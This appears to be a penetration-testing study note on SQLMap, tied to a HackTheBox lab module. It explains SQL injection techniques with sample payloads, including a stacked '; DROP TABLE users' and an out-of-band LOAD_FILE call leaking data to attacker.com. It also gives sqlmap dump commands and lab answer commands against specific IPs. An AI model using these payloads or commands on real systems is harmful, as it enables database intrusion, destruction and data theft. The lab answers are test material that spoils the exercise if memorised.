# 🐡 SQLMap Essentials

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.

We can install it the following way:

```shell-session
sudo apt install sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

The default techniques that are used are `BEUSTQ:`

* `B`: Boolean-based blind
* `E`: Error-based
* `U`: Union query-based
* `S`: Stacked queries
* `T`: Time-based blind
* `Q`: Inline queries

***

### Different types of SQLI

#### Boolean-based blind SQL Injection

```sql
AND 1=1
```

It is exploited through the differentiation of `TRUE` from `FALSE` query results

The differentiation is based on comparing server responses to determine whether the SQL query returned `TRUE` or `FALSE`.

#### Error-based SQL Injection

```sql
AND GTID_SUBSET(@@version,0)
```

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries.

#### UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results.

the attacker can get additional results from the injected statements within the page response itself.

#### Stacked queries

```sql
; DROP TABLE users
```

This works by injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default)

#### Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

#### Inline queries

```sql
SELECT (SELECT @@version) from
```

#### Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi).

### Getting Started

To get all options and switches&#x20;

```shell-session
sqlmap -hh
```

Basic command:

```shell-session
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

{% hint style="info" %}
Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.
{% endhint %}

{% hint style="info" %}
#### Different messages usually found during a scan of SQLMap ->

https://academy.hackthebox.com/module/58/section/696
{% endhint %}

To set up an SQLMap request against the specific target is by utilizing `Copy as cURL`

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shell-session
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

`GET` parameters are provided with the usage of option `-u`/`--url`

`POST` data, the `--data` flag can be used

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

If we want to use an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`

```shell-session
sqlmap -u www.target.com --data='id=1' --method PUT
```

Another way of launching sqlmap is with a burp request:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we copy and paste the request in a txt file and call it in our command:

```shell-session
sqlmap -r req.txt
```

if we have a case where we have a session cookie we need to specify it:

```shell-session
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Questions**

\#1&#x20;

```
sqlmap 'http://83.136.250.45:54294/case2.php' --data 'id=1' --batch --dump
```

\#2&#x20;

```
sqlmap 'http://83.136.250.45:54294/case3.php' --cookie='id=1*' --dump --batch
```

\#3&#x20;

```
sqlmap -r req2.txt --dump --batch
```

### Handling SQLMap Errors

`--parse-errors`, to parse the DBMS errors (if any) and displays them as part of the program run

`-t` option stores the whole traffic content to an output file

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

`-v` option, to raise the verbosity level of the console output

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

`--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Prefix & Suffix

To go faster after manual enumeration we can use  `--prefix` and `--suffix`

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in a query like this:

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

**Questions**

**#5**&#x20;

```
sqlmap http://94.237.59.231:59227/case5.php?id=1 --risk=3 --level=5 -T flag5 --no-cast --batch --dump
```

\#6&#x20;

```
sqlmap http://94.237.59.231:59227/case6.php?col=id --random-agent --batch --dump --prefix='`)' --level=5 --risk=3
```

\#7&#x20;

```
sqlmap http://94.237.59.231:59227/case7.php?id=1 --union-cols=5 --dump --no-cast
```
